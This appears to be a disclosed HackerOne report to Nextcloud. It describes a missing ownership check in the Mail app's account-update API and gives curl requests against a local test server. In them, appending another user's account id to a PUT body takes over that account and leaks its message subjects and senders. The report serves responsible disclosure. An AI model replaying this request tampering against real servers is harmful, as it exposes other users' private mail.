# Take over a mail account due missing validation of account id

## Report Details
- **Report ID**: 1094063
- **URL**: https://hackerone.com/reports/1094063
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-02-03T17:20:10.781Z
- **Disclosed**: 2021-06-01T18:10:57.967Z

## Reporter
- **Username**: kesselb
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
A validation is missing to make sure the account id belongs to the logged in user. 

To reproduce:
1. Login as user
2. Add a mail account to mail
3. Go to account settings
4. Update the account again

See a request like below: 

curl 'http://localhost:50001/index.php/apps/mail/api/accounts/%7Bid%7D' \
  -X 'PUT' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'requesttoken: qsnlh1ctCuo7T2KZ6F/8mxIXHXVpsBvvzPJRqvU+88M=:kqXVxiFjcJJWPjPzvRyO+WNGUB4N1k+ZlaAC2JBtnY0=' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'Origin: http://localhost:50001' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' \
  -H 'Cookie: oc_sessionPassphrase=%2Fsi20cgXowTcmrwZL5Ur%2FUFYByHCAyhwo0Z%2B8V%2Bk2yL9nZpqlzfKOMcxVabLYE7dfTrV1hR7%2Fsnu83fG3GZdiJ5DjHLKD79XaH91L4G%2FNNlD9SbBq%2FMWOIIrYLGqCVnj; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc64oi0n8x29=c32fab57ad6d8cbe8e4d8e118f54759a; nc_username=bob; nc_token=HQlkh1JxcSadkeAI8HzBM0ewQDuIfk%2BU; nc_session_id=c32fab57ad6d8cbe8e4d8e118f54759a' \
  --data-raw '{"autoDetect":false,"accountName":"bob","emailAddress":"bob@localhost.test","imapHost":"imap","imapPort":993,"imapSslMode":"ssl","imapUser":"user@domain.tld","imapPassword":"mypassword","smtpHost":"imap","smtpPort":25,"smtpSslMode":"tls","smtpUser":"user@domain.tld","smtpPassword":"mypassword"}' 

Take the request and append id to body. id is the account id of another account.

curl 'http://localhost:50001/index.php/apps/mail/api/accounts/%7Bid%7D' \
  -X 'PUT' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'requesttoken: qsnlh1ctCuo7T2KZ6F/8mxIXHXVpsBvvzPJRqvU+88M=:kqXVxiFjcJJWPjPzvRyO+WNGUB4N1k+ZlaAC2JBtnY0=' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'Origin: http://localhost:50001' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' \
  -H 'Cookie: oc_sessionPassphrase=%2Fsi20cgXowTcmrwZL5Ur%2FUFYByHCAyhwo0Z%2B8V%2Bk2yL9nZpqlzfKOMcxVabLYE7dfTrV1hR7%2Fsnu83fG3GZdiJ5DjHLKD79XaH91L4G%2FNNlD9SbBq%2FMWOIIrYLGqCVnj; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc64oi0n8x29=c32fab57ad6d8cbe8e4d8e118f54759a; nc_username=bob; nc_token=HQlkh1JxcSadkeAI8HzBM0ewQDuIfk%2BU; nc_session_id=c32fab57ad6d8cbe8e4d8e118f54759a' \
  --data-raw '{"autoDetect":false,"accountName":"bob","emailAddress":"bob@localhost.test","imapHost":"imap","imapPort":993,"imapSslMode":"ssl","imapUser":"user@domain.tld","imapPassword":"mypassword","smtpHost":"imap","smtpPort":25,"smtpSslMode":"tls","smtpUser":"user@domain.tld","smtpPassword":"mypassword","id":1}' 

The next request to

curl 'http://localhost:50001/index.php/apps/mail/api/messages?mailboxId=35&filter=is:pi-other&limit=20' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'requesttoken: 8q7mksjCgQLYbuJqIohYZg6zv8OCkERjy7v4SEW7G9w=:ysLW076M+3q1H7MAd8sqBH/i8qjm9hAVkumrOiDodZI=' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' \
  -H 'Cookie: oc_sessionPassphrase=%2Fsi20cgXowTcmrwZL5Ur%2FUFYByHCAyhwo0Z%2B8V%2Bk2yL9nZpqlzfKOMcxVabLYE7dfTrV1hR7%2Fsnu83fG3GZdiJ5DjHLKD79XaH91L4G%2FNNlD9SbBq%2FMWOIIrYLGqCVnj; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc64oi0n8x29=c32fab57ad6d8cbe8e4d8e118f54759a; nc_username=bob; nc_token=HQlkh1JxcSadkeAI8HzBM0ewQDuIfk%2BU; nc_session_id=c32fab57ad6d8cbe8e4d8e118f54759a' \
  --compressed

returns a list of messages like in the screenshot.

## Impact

Subject, sender and meta information about some mails are leaked.

## Attachments
- Screenshot_from_2021-02-03_18-17-13.png
